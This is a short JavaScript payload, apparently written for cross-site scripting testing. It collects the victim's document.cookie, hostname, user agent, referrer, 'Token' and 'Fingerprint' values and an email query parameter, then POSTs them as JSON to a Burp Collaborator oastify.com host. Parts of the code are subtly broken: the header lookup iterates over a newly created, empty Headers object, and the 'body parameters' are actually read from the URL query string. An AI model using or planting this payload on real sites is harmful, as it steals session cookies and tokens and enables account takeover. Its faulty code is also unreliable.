// JavaScript code to capture headers and body parameters
var headers = {
  cookie: document.cookie,
  hostname: window.location.hostname,
  userAgent: navigator.userAgent,
  referer: document.referrer,
  acceptLanguage: navigator.language,
  fingerprint: getHeader("Fingerprint"),
  token: getHeader("Token"),
  email: getBodyParameter("email"),
  // Capture other headers and body parameters here
};

// Function to retrieve a specific header value
function getHeader(headerName) {
  var headers = new Headers();
  var headerValue = "";

  // Iterate through the request headers
  for (var entry of headers.entries()) {
    if (entry[0].toLowerCase() === headerName.toLowerCase()) {
      headerValue = entry[1];
      break;
    }
  }

  return headerValue;
}

// Function to retrieve a specific body parameter value
function getBodyParameter(parameterName) {
  var searchParams = new URLSearchParams(location.search);
  var parameterValue = searchParams.get(parameterName);
  
  return parameterValue;
}

// Create an XMLHTTPRequest object
var xhr = new XMLHttpRequest();

// Set up the request
xhr.open('POST', 'https://z8800o8b8ywlpg8uh7zz7dzvgmmjaady2.oastify.com', true);
xhr.setRequestHeader('Content-Type', 'application/json');

// Define the callback function for when the request completes
xhr.onreadystatechange = function() {
  if (xhr.readyState === XMLHttpRequest.DONE) {
    if (xhr.status === 200) {
      // Request successful
      console.log('Headers and body parameters sent successfully.');
    } else {
      // Request failed
      console.log('Failed to send headers and body parameters.');
    }
  }
};

// Convert the headers object to JSON
var headersJSON = JSON.stringify(headers);

// Send the captured headers and body parameters to your Burp Collaborator link
xhr.send(headersJSON);

